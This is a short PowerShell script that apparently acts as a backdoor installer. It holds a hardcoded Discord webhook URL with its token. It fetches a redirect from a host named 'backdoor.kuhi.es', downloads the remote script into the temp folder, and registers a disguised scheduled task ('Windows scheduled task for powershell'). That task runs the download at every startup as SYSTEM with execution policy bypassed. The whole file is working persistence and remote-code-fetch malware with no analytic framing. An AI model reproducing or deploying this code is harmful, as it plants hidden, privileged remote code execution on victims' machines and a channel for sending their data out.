# Ensure the webhook URL is provided
if (-not $dc) {
    $dc = "https://discord.com/api/webhooks/1187422803079729232/6u0WSGzMOx7x7A_Gc5oe1-hTrfxoE3ppLNl8i2Uu4P8v5W6Diex-FivGOi9GvUmGgRDz"
    Write-Error "Webhook URL was not provided"
    exit
}

# Function to save the powershell script from a URL in raw format from GitHub
function Save-Script {
    $response = Invoke-WebRequest -Uri "http://backdoor.kuhi.es" -MaximumRedirection 0 -ErrorAction Ignore
    $url = $response.Headers.Location
    $destino = "$env:TEMP\Powershell\PowershellTask.ps1"
    Write-Output $destino # for testing only        
    New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
    Invoke-WebRequest -Uri $url -OutFile $destino
}

# Function to create a scheduled task to run the script in every boot
function Set-ScheduledTask {
    $taskName = "Windows scheduled task for powershell"
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Ep Bypass -dc '$dc' -File '$destino'"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    $task = Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $taskPrincipal -Force
    $task | Out-Null
}

# Execute the functions
Save-Script
Set-ScheduledTask
